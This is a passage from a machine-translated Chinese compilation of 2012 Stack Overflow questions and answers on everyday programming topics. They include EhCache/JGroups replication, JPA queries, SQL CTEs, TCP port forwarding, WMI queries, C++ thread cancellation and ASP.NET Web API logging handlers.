[net.sf.ehcache.distribution.jgroups.JGroupsCacheManagerPeerProvider] (main) JGroups Replication started for 'EH_CACHE'. JChannel: local_addr=host_x-17490
cluster_name=EH_CACHE
my_view=[host_x-17490|0] [host_x-17490] 
```

环境：

```
CentOS release 5.4 (Final)
JBboss-4.2.3 GA
Java: 1.6.0_21
RAM: 8 Gb
Hosts (machines): host_x, host_y 
```

我们使用的 Lib 版本：

```
jgroups-2.10.0.GA.jar
ehcache-jgroupsreplication-1.5.jar
ehcache-core-2.5.0.jar 
```

EhCache（ehcache.xml）的配置：

```
<ehcache>
    <cacheManagerPeerProviderFactory class="net.sf.ehcache.distribution.jgroups.JGroupsCacheManagerPeerProviderFactory"
                properties="connect=TCP(bind_port=7800):
                    TCPPING(initial_hosts=host_x[7800],host_y[7800];port_range=5;timeout=3000;
                    num_initial_members=3;up_thread=true;down_thread=true):
                    VERIFY_SUSPECT(timeout=1500;down_thread=false;up_thread=false):
                    pbcast.NAKACK(down_thread=true;up_thread=true;gc_lag=100;retransmit_timeout=3000):
                    pbcast.GMS(join_timeout=5000;join_retry_timeout=2000;shun=false;
                    print_local_addr=false;down_thread=true;up_thread=true)"
                propertySeparator="::" />

    <cache name="RECORD_CACHE" maxElementsInMemory="25000" eternal="false"
           overflowToDisk="false" memoryStoreEvictionPolicy="LFU" timeToLiveSeconds="900" >
        <cacheEventListenerFactory
                class="net.sf.ehcache.distribution.jgroups.JGroupsCacheReplicatorFactory"
                properties="replicateAsynchronously=true, replicatePuts=false, replicateUpdates=false,
                    replicateUpdatesViaCopy=false, replicateRemovals=true" />
    </cache>
</ehcache> 
```

我们检查了 host_x 上的 7800 端口可从 host_y 获得，反之亦然（通过 telnet）。

如果这里出现 OOM 问题，您能帮我们检测 root 吗？我们对不正确的复制配置有一些假设 - 但目前无法在这里定义错误在哪里。

感谢您的任何意见或建议！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:19:50.243

您的 JGroups 配置完全关闭！

首先，它可能是从一个非常旧的版本中复制而来的。其次，缺少 STABLE，这意味着消息永远不会被垃圾收集！我建议使用 2.10 版本的 JGroups（您正在使用）中的 tcp.xml 或 udp.xml。

# java - JPA Data Repository 结果丢失其数据类型

> ID：12300427
> 
> 赞同：1
> 
> 时间：2012-09-06T12:44:39.910
> 
> 标签：java, spring-data-jpa

我正在尝试获取以下代码来显示我的查询结果。不幸的是，它不起作用。

```
@Transactional
public interface ContentRepository extends JpaRepository<Content,Integer>{

     @Query(nativeQuery=true, value="SELECT content_type, COUNT(*) FROM dbo.content WHERE status_id = :statusId GROUP BY content_type")
     List<Map<String, Integer>> getContentCountByType(@Param("statusId")Short statusId); 
```

在我的服务层上，我做...

```
@Service
public class ContentService {
     @Transactional
     public Map<ContentType, Integer> getContentCountByType() {
         List<Map<String, Integer>> rawContentCount = contentRepository.getContentCountByType(Status.DRAFT);
         Map<ContentType, Integer> contentCount = new HashMap<ContentType, Integer>();
         Map<String, Integer> objects = rawContentCount.get(0); 
```

`objects`最终`Object[]`在变量调试器中。我不确定为什么它不遵守`Map<String, Integer>`我告诉它使用的。

我在想作为替代方案，我可以只返回一个对象列表。我试图在谷歌周围试图找出要搜索哪些关键字才能找到这样的结果。虽然理想情况下我想避免只为这个查询结果创建一个对象，如果它只是返回`Map`！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:47:33.897

将我的查询结果转换为`Object[]`并使用此处的文档：http: [//docs.jboss.org/hibernate/core/3.3/reference/en/html/objectstate.html#objectstate-querying-executing](http://docs.jboss.org/hibernate/core/3.3/reference/en/html/objectstate.html#objectstate-querying-executing) at section`10.4.1.2`解决了我的问题

# sql - 在选择中分配变量值，以及其他列

> ID：12300428
> 
> 赞同：2
> 
> 时间：2012-09-06T12:44:44.513
> 
> 标签：sql, sql-server, sql-server-2008

我知道您可以通过以下方式将值分配给选择中的变量

```
SELECT @blahBlah = (tbl.ProductGroup) 
FROM tbl 
```

好的，现在我需要做的如下。

每个账户/用户每天都有一定数量的交易允许；例如。账户 1 可以进行 5 笔交易，账户 2 可以进行 3 笔交易。

因此，在将确定此帐户是否超出其限制以及超出多少的选择中，我们有大量`inSelect`计算来生成列数据。

问题是我们现在有大约 4 列，每列都将执行嵌套选择以从另一个表中获取限制，以便为当前表生成一个值。

理想的做法是将这些限制分配给`@variable`select 语句中的 a ，并在需要时仅在所述语句中引用该变量。

举一个简单的例子（不是实际的逻辑）：

```
SELECT
  @Limit = (SELECT Limit From tClient Where tClient.clientId = tbl.ClientId),
  (select count(*) from batch where batchItemCount > @limit) AS BadBatches,
  ....
FROM TBL 
```

你得到图片。

有什么方法可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:51:02.427

是的，您可以使用[公用表表达式（CTE）](http://msdn.microsoft.com/en-us/library/ms190766%28v=sql.105%29.aspx)来做这些事情。以下是您可以调整以使其适用于您的案例的基本思想：

```
;WITH limtis AS
(
   SELECT Limit, ClientId
   From tClient 
   Where tClient.clientId = tbl.ClientId
)
select ...
from batch
INNER JOIN Limtis On ...
WHERE ... 
```

希望你有图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:52:27.657

尝试这样的事情

```
select clientid from tClient as t1 inner join batch as t2
 on t1.clientId=t2.clientId
 group by clientId
 having sum(batchItemCount)>sum(limit) 
```

# c# - .NET MVC 代码优先方法中的历史表？

> ID：12300429
> 
> 赞同：2
> 
> 时间：2012-09-06T12:44:45.713
> 
> 标签：c#, asp.net-mvc, database, ef-code-first

我需要使用代码优先方法跟踪 MVC .NET 应用程序中某些数据库对象的更改历史记录。

这是历史表的含义：http: [//database-programmer.blogspot.de/2008/07/history-tables.html](http://database-programmer.blogspot.de/2008/07/history-tables.html)

如果我自己编写 SQL 查询，我会使用它的历史记录表。但是在代码优先的方法中，生成了 SQL……我想坚持这种范式。

目标是一个结构，它包含更改/删除条目的所有“旧”修订以及一些附加信息（例如时间戳，更改它的用户，...）

有任何想法吗？

问候，斯特凡

更具体地说 - 这是一些代码示例：

```
public class Node {
 public int NodeID { get; set; }

 public string? data { get; set; }  // sample data
}

public class NodeHistory {
  public int NodeID { get; set; }
  public string? data { get; set; }

  public int UserID { get; set; }
  public DataTime timestamp { get; set; }
} 
```

我需要的是一些“框架”帮助，以便能够在更改持久化时向 NodeHistory 添加一个条目以表节点结构。

这意味着：仅仅覆盖 set-method 不是一个解决方案，因为它也会创建一个条目，如果对“节点”的更改没有在最后保留（例如角色回退）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T13:03:18.777

我认为对我来说最好的方法是使用存储库模式，并在您认为适合保留历史记录的 Node 对象上的每个操作上插入 NodeHistory 表。

编辑：一些代码

```
public class NodeRepository{
    public Node EditNode(Node toEdit, int userId){
        using(new TransactionScope())
        {            
            //Edit Node in NodeContext like you would anyway without repository
            NodeContext.NodeHistories.Add(new NodeHistory(){//initialise NodeHistory stuff here)
            NodeContext.SaveChagnes();
        }
    }
}
public class NodeContext:DbContext{
    public DbSet<Node> Nodes{get;set;}
    public DbSet<NodeHistory> NodeHistories{get;set;}
} 
```

如果您正在寻找比这更简单的东西，那么我不知道它可能是什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T20:47:43.880

这确实是您应该使用触发器执行的操作。是的，您必须为其编写一些 sql，但是无论更新如何发生，手动或通过其他方式都会更新历史记录。

# c# - TCP 服务器 IP 客户端连接问题

> ID：12300430
> 
> 赞同：0
> 
> 时间：2012-09-06T12:44:50.127
> 
> 标签：c#, tcp, ip

好的，所以我刚刚开始使用 c# 搞乱 TCP，并且我已经成功设置了一个服务器，我可以向它发送“Hello World”消息，无论如何我一直在本地执行此操作（因为两台笔记本电脑都连接到相同的路由器）我只是使用 192.168 号码进行连接。但它的全部目的是在互联网上工作，两台计算机的路由器 IP 地址显然是相同的，如果我输入路由器 IP 地址它不起作用，如果我输入 192.168 号码肯定会赢'不能通过互联网工作...那么我使用什么 IP，或者什么是更好的解决方案？

如果重要的话，这是代码行

```
 var client = ScsClientFactory.CreateClient(new ScsTcpEndPoint("192.168.1.142", 10085)); 
```

其中 192.168.1.142 是启动服务器的笔记本电脑的本地 IP

10085 是端口。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:49:35.103

您必须将路由器配置为将任何传入连接到端口 10085 转发到您的本地 IP 地址。然后任何人都可以使用您的外部 IP 地址进行连接。

每个路由器都有自己的配置系统，因此您必须在谷歌中搜索“端口转发”和您的路由器型号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:57:37.997

我猜这取决于您要达到的目标。例如，如果您制作聊天应用程序。客户端（在路由器后面）可以说它的本地 IP 是 192.168.1.111，路由器 IP 是 80.120.78.100。客户端将连接到服务器。

一旦建立了该连接，发送回客户端就无关紧要了，因为客户端和服务器之间的连接已经打开，因此服务器将只使用相同的连接。路由器找出“路由”数据包的位置，通常您不需要知道的东西。

但是，如果您的服务器是寻找客户端的服务器，那就不同了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T13:37:07.680

我将尝试解释一下网络，但您必须**搜索它**。

*基本上*，了解一个**IP 掩码**，例如`192.168.1.0`一个网络。路由器的作用是连接不同的网络，这就是为什么路由器通常有 2 个端口，WAN（广域网）和 LAN（本地）。

有了这个概念，您可以将*互联网*视为由各种 ISP 连接而成的一个大网络。每个 ISP 都有一个连接其网络的路由器，以及另一个为您提供 Internet 连接的路由器。最后，你家里有一个路由器。因此，从这里，您可以了解连接了 3 个网络：您的家、您的 ISP 和互联网。

为了让您能够连接到我家的计算机，我必须让这台计算机从互联网上可用，我必须*发布*它。我通过在路由器上设置**NAT**（网络区域转换）来做到这一点。此 NAT 表示“任何来自 Internet 的 12345 端口，在 80 端口转发到 192.168.1.10（我的服务器）”。

这是一个**非常**简单的解释，好吗？

* * *

现在，让我们退后一步。如果您的网络上有另一台计算机可用，您可以测试您的程序是否使用更简单的方法工作。

1.  将两台计算机连接到您的**LAN**，因此它们将获得相似的 IP 地址。`192.168.1.10`让我们假装他们是`192.168.1.20`
2.  运行服务器`10`并禁用所有类型的防火墙（Windows 和第三方）
3.  运行客户端`20`并尝试连接到服务器

# export-to-excel - 检索具有 CLSID 80070005 的组件的 COM 类工厂 访问被拒绝

> ID：12300432
> 
> 赞同：1
> 
> 时间：2012-09-06T12:44:54.940
> 
> 标签：export-to-excel, excel-interop

我正在处理应用程序，并将报告导出到 Excel 工作表。当我在我的项目上这样做时，它工作正常。但是，当我在 IIS 7（Windows 7 64 位）上运行这个应用程序时，它给了我下面提到的错误 -

由于以下错误，检索具有 CLSID {00024500-0000-0000-C000-000000000046} 的组件的 COM 类工厂失败：80070005 访问被拒绝。

我已经尝试了很多在线可用的解决方案，但没有用。请建议我可能是什么问题以及解决此问题的方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T22:35:00.580

好吧，我遇到了同样的问题，可能是以下原因之一：

1.  您正在使用的 Excel 所需的 DLL 不存在。
2.  不同服务器上的不同版本的 Excel。
3.  权限问题

请让我知道您的情况可能是什么问题，也许我可以帮助您。

# android - android日历中的API级别错误

> ID：12300433
> 
> 赞同：1
> 
> 时间：2012-09-06T12:44:58.793
> 
> 标签：android, android-calendar

当我在 android 4.1 中编写此代码时

```
 Intent intent = new Intent(Intent.ACTION_INSERT);
    intent.setData(CalendarContract.Events.CONTENT_URI);
    startActivity(intent); 
```

它给了我以下错误：

```
Field requires API level 14 (current min is 8): 
                   android.provider.CalendarContract$Events#CONTENT_URI 
```

请告诉我如何解决这个问题。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:51:11.933

在您的 AndroidManifest.xml 文件中更改

```
android:minSdkVersion="8" 
```

到

```
android:minSdkVersion="14" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:50:35.710

```
 change android manifest.xml android:minSdkVersion="8" 8 to 14. 
```

# c++ - 如何从 C++ 中的 Windows 注册表中获取计算机制造商和型号？

> ID：12300442
> 
> 赞同：7
> 
> 时间：2012-09-06T12:45:16.560
> 
> 标签：c++, windows, visual-studio-2010

我正在编写自己的 C++ 代码，通过读取和解析注册表项来读取 Windows 计算机上的计算机型号和制造商

```
HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/services/mssmbios/Data/SMBiosData 
```

Windows / C++ / Visual Studio 中是否有任何库函数可以让我直接获取这些信息？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-07T18:39:27.590

您需要的步骤在[使用 C++ 创建 WMI 应用程序](http://msdn.microsoft.com/en-us/library/windows/desktop/aa389762%28v=vs.85%29.aspx)中进行了说明。MSDN 甚至包括[一个示例程序](http://msdn.microsoft.com/en-us/library/windows/desktop/aa390418%28v=vs.85%29.aspx)。您只需要更改两个字符串。

1.  更改`SELECT * FROM Win32_Process`为`SELECT * FROM Win32_ComputerSystem`
2.  更改`Name`为`Manufacturer`，然后再次更改为`Model`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-01-31T01:35:23.737

在[Microsoft 示例代码](https://msdn.microsoft.com/en-us/library/windows/desktop/aa390418(v=vs.85).aspx)的帮助下，我能够创建此方法。

```
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

std::pair<CString,CString> getComputerManufacturerAndModel() {
    // Obtain the initial locator to Windows Management on a particular host computer.
    IWbemLocator *locator = nullptr;
    IWbemServices *services = nullptr;
    auto hResult = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&locator);

    auto hasFailed = [&hResult]() {
        if (FAILED(hResult)) {
            auto error = _com_error(hResult);
            TRACE(error.ErrorMessage());
            TRACE(error.Description().Detach());
            return true;
        }
        return false;
    };

    auto getValue = [&hResult, &hasFailed](IWbemClassObject *classObject, LPCWSTR property) {
        CString propertyValueText = "Not set";
        VARIANT propertyValue;
        hResult = classObject->Get(property, 0, &propertyValue, 0, 0);
        if (!hasFailed()) {
            if ((propertyValue.vt == VT_NULL) || (propertyValue.vt == VT_EMPTY)) {
            } else if (propertyValue.vt & VT_ARRAY) {
                propertyValueText = "Unknown"; //Array types not supported
            } else {
                propertyValueText = propertyValue.bstrVal;
            }
        }
        VariantClear(&propertyValue);
        return propertyValueText;
    };

    CString manufacturer = "Not set";
    CString model = "Not set";
    if (!hasFailed()) {
        // Connect to the root\cimv2 namespace with the current user and obtain pointer pSvc to make IWbemServices calls.
        hResult = locator->ConnectServer(L"ROOT\\CIMV2", nullptr, nullptr, 0, NULL, 0, 0, &services);

        if (!hasFailed()) {
            // Set the IWbemServices proxy so that impersonation of the user (client) occurs.
            hResult = CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL,
                RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

            if (!hasFailed()) {
                IEnumWbemClassObject* classObjectEnumerator = nullptr;
                hResult = services->ExecQuery(L"WQL", L"SELECT * FROM Win32_ComputerSystem", WBEM_FLAG_FORWARD_ONLY |
                    WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &classObjectEnumerator);
                if (!hasFailed()) {
                    IWbemClassObject *classObject;
                    ULONG uReturn = 0;
                    hResult = classObjectEnumerator->Next(WBEM_INFINITE, 1, &classObject, &uReturn);
                    if (uReturn != 0) {
                        manufacturer = getValue(classObject, (LPCWSTR)L"Manufacturer");
                        model = getValue(classObject, (LPCWSTR)L"Model");
                    }
                    classObject->Release();
                }
                classObjectEnumerator->Release();
            }
        }
    }

    if (locator) {
        locator->Release();
    }
    if (services) {
        services->Release();
    }
    CoUninitialize();
    return { manufacturer, model };
} 
```

# java - dispatcher.forward() 和之间有什么区别吗 ?

> ID：12300445
> 
> 赞同：1
> 
> 时间：2012-09-06T12:45:26.087
> 
> 标签：java, jsp, jakarta-ee

以下操作是否完全相同：

```
request.setAttribute(name,"visited");
requestDispatcher.forward(request,response) 
```

和

```
<jsp:forward page="page.jsp">
  <jsp:param name="status" value="visited"/>
</jsp:forward> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:54:19.120

两者都是相同的，唯一的区别是单独的`tag handler`类是为`<jsp:forward>`.

请参阅标签处理程序的[教程](http://roseindia.net/jsp/simple-jsp-example/TagHandlerForm.shtml)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T13:02:24.190

没有功能上的区别。两者`<jsp:forward>`和 RequestDispatcher.forward() 都是相同的，实际上在 `<jsp:forward>`内部使用 `RequestDispatcher.forward()`来转发请求。是动作标签，并且有标签处理程序类。永远记住 JSP 也会被 web 容器转换为 servlet。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-23T01:09:15.457

如果只考虑前向动作，则没有功能差异。但它们似乎并不完全相同。我测试以下代码。

```
<%
System.out.println("source 1");
RequestDispatcher disp = request.getRequestDispatcher("1_f1.jsp");
disp.forward(request, response);
System.out.println("source 2");
%> 
```

和

```
<%
System.out.println("source 1");
%>
<jsp:forward page="1_f1.jsp"/>
<%
System.out.println("source 2");
%> 
```

使用时`disp.forward()`，控制台会输出“source 2”。但是使用时`<jsp:forward/>`，不会输出“source 2”。

将转换为以下语句。

```
pageContext = _jspxFactory.getPageContext(this, request, response,
    null, true, 8192, true);
_jspx_page_context = pageContext;
if (true) {
    _jspx_page_context.forward("1_f1.jsp");
    return;
} 
```

这是一个`return;`声明。因此，之后的代码`<jsp:forward/>`将无法运行。

# c# - ASP.NET 解决方案部署到开发服务器使用本地路径

> ID：12300447
> 
> 赞同：1
> 
> 时间：2012-09-06T12:45:28.787
> 
> 标签：c#, asp.net, visual-studio-2010

使用 Visual Studio 2010，我将 ASP.NET 项目部署到开发服务器并更改了 Web.Config 以反映开发服务器路径。一些代码正在运行，但对于图像和其他文件等路径，它似乎正在查看我机器的本地路径。我查看了所有代码以提示它在哪里使用我的本地路径，但我替换了所有代码，但它仍然无法正常工作。

DLL 都在正确的位置编译，一切都是最新的，等等。在本地运行代码也没有问题。是否有特定步骤来确保我缺少的部署？

谢谢。

错误：

```
`Object reference not set to an instance of an object. 
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. 

Exception Details: System.NullReferenceException: Object reference not set to an instance of an object.

Source Error: 

An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.  

Stack Trace: 

[NullReferenceException: Object reference not set to an instance of an object.]
   FieldControl(String FieldType, String Argument, Field ParentField) in D:\Users\mydirectory\FieldControl.cs:132
   <more of these> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:57:35.267

你用相对路径调整你的路径。

相对于站点根目录的路径，根据站点根目录（而不是应用程序）确定。如果您保持应用程序资源交叉，例如网站根目录下文件夹中的图像或客户端脚本文件，则相对于站点根目录的路径非常有用。

他的示例假定路径 Assemblies 文件夹位于网站根目录下。

```
"/Assemblies/test.dll" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T13:16:33.440

解决了。我的 Web.Config 是只读的，所以当我在开发服务器上更改路径时，它没有正确保存。返回并更改路径，然后将其设为只读。感谢大家的帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-06T12:55:19.377

这种类型的错误并不是说它正在寻找该本地路径，这只是代码中的错误所在，编译器会向您显示问题所在：该文件的第 132 行。检查那里，你应该看到是什么触发了 NULL ref。

# c++ - 取消运行长时间操作的线程

> ID：12300448
> 
> 赞同：6
> 
> 时间：2012-09-06T12:45:31.577
> 
> 标签：c++, multithreading, oop, design-patterns

我正在努力解决我遇到的设计困境。

```
ClassWithLongOperation
{
    Run()
    {
        RecrusiveOperation();
    }

    RecrusiveOperation()
    {
        /* RECURSION */
    }
}

MyThread
{
    ClassWithLongOperation Op1(10);
    Op1.Run();  // Takes several minutes.

    ClassWithLongOperation Op2(20);
    Op2.Run();

    SomeOtherClassWithLongOperation Op3;
    Op3.Run();

    // Do some other stuff
} 
```

GUI 启动*MyThread*，它运行了 5-6 分钟。我希望能够在我的 GUI 上有一个大的取消按钮，以便用户可以取消操作。

我可以创建一个全局布尔变量*bCancelled*，并检查它是否已在*RecursiveOperation*中设置，但我想成为一名优秀的 C++ 和 OO 程序员并避免使用全局变量。特别是如果它们必须分布在多个文件中。

那么我将如何（遵循良好的设计）安全地取消*MyThread*？我可以在我的设置中进行哪些更改以允许这样做？

我也`_beginthreadex`用来启动线程，但如果它允许更简单的解决方案，我可以使用 boost。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-06T12:49:37.933

您的标志不需要对您的整个程序是全局的，但它需要对您的类代码可见。创建标志作为私有实例成员和公共函数以将其更改为 false/true。在您的递归函数中，测试其值以验证任务是否应该继续。当您需要时，将其值设置为 false（当然是通过函数）以停止递归调用，即，当用户单击按钮时，您在所需实例中调用函数。这样您就不会破坏任何 OO 原则，因为您有一个私有标志和一个公共成员函数来安全地更改它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-06T13:10:16.323

使用全局变量实际上并不是世界上最糟糕的事情。不必要的全局变量的扩散会导致维护噩梦，但实际上这听起来像是一个快速且易于理解的解决方案。但是如果你想要一个干净的 OO 解决方案，这当然是可能的：

**编辑**我原来的帖子忽略了这样一个事实，即您希望能够按顺序运行多个操作，如果其中任何一个被取消，则不会执行任何剩余的操作。这意味着将标志保留在取消器中更有用`bool`，而不是在每个可取消操作中单独保留；异常是处理实际控制流的最佳方式。我还加强了一些东西（`volatile`为标志本身添加，使名称更清晰，限制不必要的访问权限）。

```
// A thing that can cancel another thing by setting a bool to true.
class Canceller {
public:
    Canceller : cancelledFlag(false) {}

    void RegisterCancellee(Cancellee const& c) {
        c.RegisterCanceller(cancelledFlag);
    }

    void Cancel() {
        cancelledFlag = true;
    }

private:
    volatile bool cancelledFlag;
};

class CancelButton : public Canceller {
    ...
    // Call Cancel() from on-click event handler
    ...
};

class Cancellation : public std::exception {
public:
    virtual const char* what() const throw() {
        return "User cancelled operation";
    }
};

// A thing that can be cancelled by something else.
class Cancellee {
    friend class Canceller;    // Give them access to RegisterCanceller()

protected:
    Cancellee() : pCancelledFlag(0) {}

    // Does nothing if unconnected
    void CheckForCancellation() {
        if (pCancelledFlag && *pCancelledFlag) throw Cancellation();
    }

private:
    void RegisterCanceller(volatile bool& cancelledFlag) {
        pCancelledFlag = &cancelledFlag;
    }

    volatile bool* pCancelledFlag;
};

class Op1 : public Cancellee {   // (And similarly for Op2 and Op3)
    ...
    // Poll CheckForCancellation() inside main working loop
    ...
};

MyThread
{
    CancelButton cancelButton("CANCEL!");

    try {
        ClassWithLongOperation Op1(10);
        cancelButton.RegisterCancellee(Op1);
        Op1.Run();  // Takes several minutes.

        ClassWithLongOperation Op2(20);
        cancelButton.RegisterCancellee(Op2);
        Op2.Run();

        SomeOtherClassWithLongOperation Op3;
        cancelButton.RegisterCancellee(Op3);
        Op3.Run();
    } catch (Cancellation& c) {
        // Maybe write to a log file
    }

    // Do some other stuff
} 
```

“双弹跳”注册允许取消程序访问私有标志变量。

最重要的是*不要*使用线程终止函数，除非在非常特殊的情况下。为什么？他们不运行析构函数。他们也没有给目标线程任何“清理”的机会。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T12:48:33.573

不使用全局变量，而是向 ClassWithLongOperation 和/或 MyThread 添加一个方法，类似于 cancelOperation() 将设置一个内部布尔变量。然后，适当的类方法需要在适当的时候检查变量。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-06T12:49:09.447

您可以为 ClassWithLongOperation 实现一个 Stop() 方法，并让 BigFatCancelButton 的事件处理程序为当前操作调用此 Stop() 方法。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-06T13:02:07.230

...或者向 Thread 类添加一个 Stop() 方法，并使工作对象知道它们正在运行的线程。您也可以为工作对象添加一个 Stop() 方法。取决于更重要的：停止线程或工作对象。

# java - Xuggler Encoding video of Desktop With Audio - 音频有差距

> ID：12300449
> 
> 赞同：1
> 
> 时间：2012-09-06T12:45:35.467
> 
> 标签：java, encoding, ffmpeg, video-streaming, xuggler

我正在使用 Xuggler 转换从 java Robot 类捕获的图像和从 TargetDataLine 类读取的声音，并将其编码为视频。然后，我尝试通过 http（Socket OutputStream）将此视频数据（在写入我的标头之后）流式传输到 Flash 客户端，但无论我在客户端使用什么缓冲区值，它都会播放和断断续续（从不流畅播放）。

我正在寻求帮助并显示我的 java 代码，因为我怀疑这可能与我如何编码视频或通过我没有得到的 http 套接字发送数据有关。

```
ByteArrayURLHandler ba = new ByteArrayURLHandler();
final IRational FRAME_RATE = IRational.make(30); 
final int SECONDS_TO_RUN_FOR = 20; 
final Robot robot = new Robot(); 
final Toolkit toolkit = Toolkit.getDefaultToolkit(); 
final Rectangle screenBounds = new Rectangle(toolkit.getScreenSize()); 
IMediaWriter writer;

writer = ToolFactory.makeWriter(
    XugglerIO.map( 
        XugglerIO.generateUniqueName(out, ".flv"), 
        out 
    )); 

writer.addListener(new MediaListenerAdapter() { 
    public void onAddStream(IAddStreamEvent event) { 
        event.getSource().getContainer().setInputBufferLength(1000);
        IStreamCoder coder = event.getSource().getContainer().getStream(event.getStreamIndex()).getStreamCoder();
        if (coder.getCodecType() == ICodec.Type.CODEC_TYPE_AUDIO) { 
            coder.setFlag(IStreamCoder.Flags.FLAG_QSCALE, false);   
            coder.setBitRate(32000); 
            System.out.println("onaddstream"+ coder.getPropertyNames().toString());
        } 
        if (coder.getCodecType() == ICodec.Type.CODEC_TYPE_VIDEO) { 
            // coder.setBitRate(64000); 
            // coder.setBitRateTolerance(64000); 
        } 
    } 
});

writer.addVideoStream(videoStreamIndex, videoStreamId, 1024, 768);
final int channelCount = 1;       

int audionumber =   writer.addAudioStream(audioStreamIndex, audioStreamId,1, 44100);
int bufferSize = (int)audioFormat.getSampleRate()   *audioFormat.getFrameSize();//*6;///6;
byte[] audioBuf;// = new byte[bufferSize]; 

int i = 0;

final int audioStreamIndex = 1;
final int audioStreamId = 1;
BufferedImage screen, bgrScreen;
long startTime = System.nanoTime();
while(keepGoing)
{ 

    audioBuf = new byte[bufferSize]; 
    i++;

    screen = robot.createScreenCapture(screenBounds); 

    bgrScreen = convertToType(screen, BufferedImage.TYPE_3BYTE_BGR); 
    long nanoTs = System.nanoTime()-startTime; 
    writer.encodeVideo(0, bgrScreen, nanoTs, TimeUnit.NANOSECONDS);
    audioBuf = new byte[line.available()];
    int nBytesRead = line.read(audioBuf, 0, audioBuf.length); 

    IBuffer iBuf = IBuffer.make(null, audioBuf, 0, nBytesRead);

    IAudioSamples smp = IAudioSamples.make(iBuf,1,IAudioSamples.Format.FMT_S16);
    if (smp == null) {
        return;
    }

    long numSample = audioBuf.length / smp.getSampleSize();

    smp.setComplete(true, numSample,(int)
    audioFormat.getSampleRate(), audioFormat.getChannels(),
    IAudioSamples.Format.FMT_S16, nanoTs/1000);

    writer.encodeAudio(1, smp);

    writer.flush();
} 
```

# c# - Web API 审计日志

> ID：12300458
> 
> 赞同：9
> 
> 时间：2012-09-06T12:46:07.553
> 
> 标签：c#, asp.net, asp.net-web-api

我需要审核对我的 Web API 的日志调用，理想情况下我想使用一个属性，例如：

```
 [HttpPost, Auditing]
    public dynamic MyAPICall() 
```

属性应该能够在执行之前和之后拦截 API 调用，以便记录参数以及 API 调用运行的时间。

使用 MVC，我可以创建一个 ActionFilterAttribute 派生并覆盖 OnActionExecuted 和 OnActionExecuting。

Web API 世界中的等价物是否可行？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-24T19:59:14.450

Http 消息处理程序应该是用于此类目的的一个很好的可扩展点。但要小心，并发请求内容读取可能存在一些问题。例如，Model Binder 可能会在读取请求内容时尝试读取请求内容，`LoggingHandler`但无法反序列化模型。要防止此类问题，只需将等待调用添加到 LogRequestLoggingInfo 方法。

```
public class LoggingHandler : DelegatingHandler
{
    protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
    {
        // Log the request information
        LogRequestLoggingInfo(request);

        // Execute the request
        return base.SendAsync(request, cancellationToken).ContinueWith(task =>
        {
            var response = task.Result;
            // Extract the response logging info then persist the information
            LogResponseLoggingInfo(response);
            return response;
        });
    }

    private void LogRequestLoggingInfo(HttpRequestMessage request)
    {
        if (request.Content != null)
        {
            request.Content.ReadAsByteArrayAsync()
                .ContinueWith(task =>
                    {
                        var result = Encoding.UTF8.GetString(task.Result);
                        // Log it somewhere
                    }).Wait(); // !!! Here is the fix !!!
        }
    }

    private void LogResponseLoggingInfo(HttpResponseMessage response)
    {
        if (response.Content != null)
        {
            response.Content.ReadAsByteArrayAsync()
                .ContinueWith(task =>
                {
                    var responseMsg = Encoding.UTF8.GetString(task.Result);
                    // Log it somewhere
                });
        }
    }
} 
```

[你可以在这里](http://homenko.net/post/2013/04/22/Common-issue-with-Web-Api-RequestResponse-logging)阅读更多关于它的信息。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-09-06T12:50:42.620

我会使用消息处理程序而不是属性。

```
public class LoggingHandler : DelegatingHandler
{
    protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
    {
        LogRequest(request);

        return base.SendAsync(request, cancellationToken).ContinueWith(task =>
        {
            var response = task.Result;

            LogResponse(response);

            return response;
        });
    }

    private void LogRequest(HttpRequestMessage request)
    {
        (request.Content ?? new StringContent("")).ReadAsStringAsync().ContinueWith(x =>
        {
